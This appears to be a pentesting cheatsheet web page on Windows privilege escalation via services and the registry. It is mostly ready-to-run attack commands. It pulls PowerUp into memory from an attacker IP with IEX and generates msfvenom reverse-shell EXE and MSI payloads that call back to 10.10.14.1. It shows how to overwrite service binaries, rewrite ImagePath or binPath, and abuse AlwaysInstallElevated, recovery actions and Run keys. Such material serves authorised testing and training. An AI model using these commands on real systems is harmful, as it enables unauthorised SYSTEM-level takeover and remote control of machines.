@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PrivEsc - Services &amp; Registry | JinPwn</title><meta name="description" content="Services run as SYSTEM by default. If you can change what a service runs, you become SYSTEM. Registry is the same surface from a different angle.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/windows/w04-privesc---services--registry/">
+<meta property="og:title" content="PrivEsc - Services &amp; Registry | JinPwn">
+<meta property="og:description" content="Services run as SYSTEM by default. If you can change what a service runs, you become SYSTEM. Registry is the same surface from a different angle.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/windows/w04-privesc---services--registry/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="PrivEsc - Services &amp; Registry | JinPwn">
+<meta name="twitter:description" content="Services run as SYSTEM by default. If you can change what a service runs, you become SYSTEM. Registry is the same surface from a different angle.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Services run as SYSTEM by default. If you can change what a service runs, you become SYSTEM. Registry is the same surface from a different angle.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"PrivEsc - Services \u0026 Registry | JinPwn","url":"https://jinpwn.dev/cheatsheets/windows/w04-privesc---services--registry/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Windows Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/windows/" class="cheatsheet-sidebar-section">Windows Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/windows/00-windows-moc/" class="cheatsheet-sidebar-link">Windows MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w01-recon--enum/" class="cheatsheet-sidebar-link">Recon &amp; Enum</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w02-local-enum/" class="cheatsheet-sidebar-link">Local Enum</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w03-privesc---tokens--privileges/" class="cheatsheet-sidebar-link">PrivEsc - Tokens &amp; Privileges</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w04-privesc---services--registry/" class="cheatsheet-sidebar-link is-current">PrivEsc - Services &amp; Registry</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w05-privesc---dll--unquoted-paths/" class="cheatsheet-sidebar-link">PrivEsc - DLL &amp; Unquoted Paths</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w06-privesc---credentials--files/" class="cheatsheet-sidebar-link">PrivEsc - Credentials &amp; Files</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w07-uac-bypass/" class="cheatsheet-sidebar-link">UAC Bypass</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w08-privesc---kernel--exploits/" class="cheatsheet-sidebar-link">PrivEsc - Kernel &amp; Exploits</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w09-lolbas/" class="cheatsheet-sidebar-link">LOLBAS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w10-defender--amsi-evasion/" class="cheatsheet-sidebar-link">Defender &amp; AMSI Evasion</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/windows/w11-lateral-movement/" class="cheatsheet-sidebar-link">Lateral Movement</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>PrivEsc - Services &amp; Registry</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">PrivEsc - Services &amp; Registry</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Windows Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/windows/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/00-windows-moc/" class="cheatsheet-mobile-sections-link">Windows MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w01-recon--enum/" class="cheatsheet-mobile-sections-link">Recon &amp; Enum</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w02-local-enum/" class="cheatsheet-mobile-sections-link">Local Enum</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w03-privesc---tokens--privileges/" class="cheatsheet-mobile-sections-link">PrivEsc - Tokens &amp; Privileges</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w04-privesc---services--registry/" class="cheatsheet-mobile-sections-link is-current">PrivEsc - Services &amp; Registry</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w05-privesc---dll--unquoted-paths/" class="cheatsheet-mobile-sections-link">PrivEsc - DLL &amp; Unquoted Paths</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w06-privesc---credentials--files/" class="cheatsheet-mobile-sections-link">PrivEsc - Credentials &amp; Files</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w07-uac-bypass/" class="cheatsheet-mobile-sections-link">UAC Bypass</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w08-privesc---kernel--exploits/" class="cheatsheet-mobile-sections-link">PrivEsc - Kernel &amp; Exploits</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w09-lolbas/" class="cheatsheet-mobile-sections-link">LOLBAS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w10-defender--amsi-evasion/" class="cheatsheet-mobile-sections-link">Defender &amp; AMSI Evasion</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/windows/w11-lateral-movement/" class="cheatsheet-mobile-sections-link">Lateral Movement</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>Services run as SYSTEM by default. If you can change what a service runs, you become SYSTEM. Registry is the same surface from a different angle.</p>
+<h2 id="i-enumerate-writable-service-surfaces" data-heading-permalink="true"><span class="heading-content">i. Enumerate writable service surfaces</span>
+    <a class="heading-permalink" href="#i-enumerate-writable-service-surfaces" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Full service list with paths and start mode:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-CimInstance</span> <span class="n">Win32_Service</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span><span class="n">DisplayName</span><span class="p">,</span><span class="n">StartName</span><span class="p">,</span><span class="n">StartMode</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">PathName</span>
+</span></span></code></pre></div><p>The four ways to hijack a service:</p>
+<ol>
+<li><strong>Service binary writable</strong> -&gt; overwrite the EXE</li>
+<li><strong>Service binary directory writable</strong> -&gt; drop a DLL it loads</li>
+<li><strong>Service registry key writable</strong> -&gt; change ImagePath</li>
+<li><strong>Service config writable via SCM</strong> -&gt; sc.exe config</li>
+</ol>
+<p>Check all four with PowerUp / PrivescCheck in one go:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.1/PowerUp.ps1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-AllChecks</span>
+</span></span><span class="line"><span class="cl"><span class="c">## or just service checks:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ModifiableServiceFile</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ModifiableService</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-UnquotedService</span>
+</span></span></code></pre></div><h2 id="ii-writable-service-binary" data-heading-permalink="true"><span class="heading-content">ii. Writable service binary</span>
+    <a class="heading-permalink" href="#ii-writable-service-binary" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>The classic. Service points to <code>C:\Apps\backup.exe</code>, you can write it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">## Check</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$svc</span> <span class="p">=</span> <span class="s2">&#34;vulnsvc&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$path</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-CimInstance</span> <span class="n">Win32_Service</span> <span class="n">-Filter</span> <span class="s2">&#34;Name=&#39;</span><span class="nv">$svc</span><span class="s2">&#39;&#34;</span><span class="p">).</span><span class="py">PathName</span> <span class="o">-replace</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$exe</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$path</span> <span class="n">-split</span> <span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mf">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="nb">Get-Acl</span> <span class="nv">$exe</span><span class="p">).</span><span class="py">Access</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">FileSystemRights</span> <span class="o">-match</span> <span class="s1">&#39;Write|Modify|FullControl&#39;</span><span class="p">}</span>
+</span></span></code></pre></div><p>Exploit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">## Backup the original</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Copy-Item</span> <span class="n">C:</span><span class="p">\</span><span class="n">Apps</span><span class="p">\</span><span class="n">backup</span><span class="p">.</span><span class="py">exe</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">backup</span><span class="p">.</span><span class="py">exe</span><span class="p">.</span><span class="py">bak</span>
+</span></span><span class="line"><span class="cl"><span class="c">## Drop msfvenom-generated reverse shell EXE</span>
+</span></span><span class="line"><span class="cl"><span class="c">## On attacker:</span>
+</span></span><span class="line"><span class="cl"><span class="c">## msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe &gt; sh.exe</span>
+</span></span><span class="line"><span class="cl"><span class="c">## On target:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">iwr </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">1</span><span class="p">/</span><span class="n">sh</span><span class="p">.</span><span class="py">exe</span> <span class="n">-o</span> <span class="n">C:</span><span class="p">\</span><span class="n">Apps</span><span class="p">\</span><span class="n">backup</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="c">## Restart the service:</span>
+</span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">stop</span> <span class="n">vulnsvc</span><span class="p">;</span> <span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="nb">start </span><span class="n">vulnsvc</span>
+</span></span><span class="line"><span class="cl"><span class="c">## Or wait for next restart / reboot</span>
+</span></span></code></pre></div><h2 id="iii-writable-service-binary-directory-dll-hijack-adjacent" data-heading-permalink="true"><span class="heading-content">iii. Writable service binary directory (DLL hijack adjacent)</span>
+    <a class="heading-permalink" href="#iii-writable-service-binary-directory-dll-hijack-adjacent" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>The exe sits in a writable folder. You can&rsquo;t overwrite it, but Windows looks for some DLLs in the exe&rsquo;s folder. See <a href="https://jinpwn.dev/cheatsheets/windows/w05-privesc---dll--unquoted-paths/">PrivEsc - DLL &amp; Unquoted Paths</a>
+ for the DLL planting techniques.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="p">=</span> <span class="nb">Split-Path</span> <span class="n">-Parent</span> <span class="p">((</span><span class="nb">Get-CimInstance</span> <span class="n">Win32_Service</span> <span class="n">-Filter</span> <span class="s2">&#34;Name=&#39;vulnsvc&#39;&#34;</span><span class="p">).</span><span class="py">PathName</span> <span class="o">-replace</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="nb">Get-Acl</span> <span class="nv">$dir</span><span class="p">).</span><span class="py">Access</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">FileSystemRights</span> <span class="o">-match</span> <span class="s1">&#39;Write|Modify|FullControl&#39;</span><span class="p">}</span>
+</span></span></code></pre></div><p>If writable, plant a DLL the binary loads. Use Process Monitor (on attacker test box) to identify which DLL.</p>
+<h2 id="iv-writable-service-registry-key" data-heading-permalink="true"><span class="heading-content">iv. Writable service registry key</span>
+    <a class="heading-permalink" href="#iv-writable-service-registry-key" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Service config lives at <code>HKLM\SYSTEM\CurrentControlSet\Services\&lt;name&gt;</code>. If the key is writable, change <code>ImagePath</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg query <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Services\vulnsvc&#34;</span>
+</span></span><span class="line"><span class="cl">## Check ACL with Get-Acl:
+</span></span><span class="line"><span class="cl">powershell <span class="s2">&#34;Get-Acl &#39;HKLM:\SYSTEM\CurrentControlSet\Services\vulnsvc&#39; | Format-List&#34;</span>
+</span></span><span class="line"><span class="cl">## If you have FullControl/SetValue:
+</span></span><span class="line"><span class="cl">reg add <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Services\vulnsvc&#34;</span> /v ImagePath /t REG_EXPAND_SZ /d <span class="s2">&#34;C:\Windows\Temp\sh.exe&#34;</span> /f
+</span></span><span class="line"><span class="cl">sc.exe stop vulnsvc; sc.exe start vulnsvc
+</span></span></code></pre></div><h2 id="v-writable-service-via-scm-scexe-config" data-heading-permalink="true"><span class="heading-content">v. Writable service via SCM (sc.exe config)</span>
+    <a class="heading-permalink" href="#v-writable-service-via-scm-scexe-config" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p><code>sc.exe config</code> changes the BinPath if your token has <code>SERVICE_CHANGE_CONFIG</code> on the service. Different from registry write, you don&rsquo;t need direct ACL on the reg key:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">## Check:
+</span></span><span class="line"><span class="cl">sc.exe sdshow vulnsvc
+</span></span><span class="line"><span class="cl">## Look for (A;;CCLCSWRPWPDTLOCRRC;;;BU) where BU = Builtin Users
+</span></span><span class="line"><span class="cl">## CO = SERVICE_CHANGE_CONFIG, if present you can do:
+</span></span><span class="line"><span class="cl">sc.exe config vulnsvc binPath= <span class="s2">&#34;C:\Windows\Temp\sh.exe&#34;</span>
+</span></span><span class="line"><span class="cl">sc.exe stop vulnsvc; sc.exe start vulnsvc
+</span></span></code></pre></div><div class="obsidian-callout callout-warning">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+          <path d="M12 9v4"></path>
+          <path d="M12 17h.01"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">binPath= has a space</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>The space after <code>binPath=</code> is mandatory. Forget it and you get a useless error. Same for <code>obj=</code>, <code>displayname=</code>.</p>
+  </div>
+</div>
+<h2 id="vi-alwaysinstallelevated" data-heading-permalink="true"><span class="heading-content">vi. AlwaysInstallElevated</span>
+    <a class="heading-permalink" href="#vi-alwaysinstallelevated" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Already covered in <a href="https://jinpwn.dev/cheatsheets/windows/w02-local-enum/">Local Enum</a>
+ but it really belongs here as a registry-based privesc.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</span></span><span class="line"><span class="cl">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</span></span></code></pre></div><p>Both = 1 means any user can install MSI as SYSTEM:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f msi -o sh.msi
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">msiexec /quiet /qn /i C:\Windows\Temp\sh.msi
+</span></span></code></pre></div><h2 id="vii-autoruns-and-registry-persistence-keys" data-heading-permalink="true"><span class="heading-content">vii. Autoruns and registry persistence keys</span>
+    <a class="heading-permalink" href="#vii-autoruns-and-registry-persistence-keys" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Same keys used by malware for persistence are abuseable when writable. If a higher-priv user logs in and one of these keys is writable by you, plant a payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg query <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34;</span>
+</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&#34;</span>
+</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34;</span>
+</span></span><span class="line"><span class="cl">## Check who else logs in to this box:
+</span></span><span class="line"><span class="cl">quser /server:localhost
+</span></span></code></pre></div><p>If admin RDPs to this box and <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> is somehow writable cross-user (rare), you can wait for them to log in.</p>
+<h2 id="viii-windows-service-recovery-actions" data-heading-permalink="true"><span class="heading-content">viii. Windows Service Recovery actions</span>
+    <a class="heading-permalink" href="#viii-windows-service-recovery-actions" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>A service&rsquo;s recovery action can be set to &ldquo;Run a Program&rdquo;. If you can change recovery actions, crash the service to trigger your program:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">sc.exe failure vulnsvc reset= 0 actions= run/0 command= <span class="s2">&#34;C:\Windows\Temp\sh.exe&#34;</span>
+</span></span><span class="line"><span class="cl">sc.exe stop vulnsvc       ## crash to trigger
+</span></span></code></pre></div><h2 id="ix-print-spooler-tricks" data-heading-permalink="true"><span class="heading-content">ix. Print Spooler tricks</span>
+    <a class="heading-permalink" href="#ix-print-spooler-tricks" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Spooler running and writable port monitor registry key = SYSTEM:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg query <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors&#34;</span>
+</span></span><span class="line"><span class="cl">## If you can add a key, register a malicious port monitor DLL
+</span></span></code></pre></div><p>PrintNightmare (CVE-2021-34527) is a related Spooler vuln, see <a href="https://jinpwn.dev/cheatsheets/windows/w08-privesc---kernel--exploits/">PrivEsc - Kernel &amp; Exploits</a>
+.</p>
+<h2 id="x-after-service-privesc" data-heading-permalink="true"><span class="heading-content">x. After service privesc</span>
+    <a class="heading-permalink" href="#x-after-service-privesc" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">## You should have SYSTEM now via the service running your binary
+</span></span><span class="line"><span class="cl">## Confirm:
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">## Grab a stable shell if your callback was the service itself
+</span></span></code></pre></div><p>Backup-restore:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">## Restore the original service binary
+</span></span><span class="line"><span class="cl"><span class="k">copy</span> C:\Windows\Temp\backup.exe.bak C:\Apps\backup.exe /Y
+</span></span><span class="line"><span class="cl">sc.exe stop vulnsvc <span class="p">&amp;</span> sc.exe start vulnsvc
+</span></span></code></pre></div><p>See <a href="https://jinpwn.dev/cheatsheets/linux-pentesting/13-persistence--cleanup/">Persistence &amp; Cleanup</a>
+ for the full cleanup checklist.</p>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/windows/w03-privesc---tokens--privileges/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">PrivEsc - Tokens &amp; Privileges</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/windows/w05-privesc---dll--unquoted-paths/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">PrivEsc - DLL &amp; Unquoted Paths</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
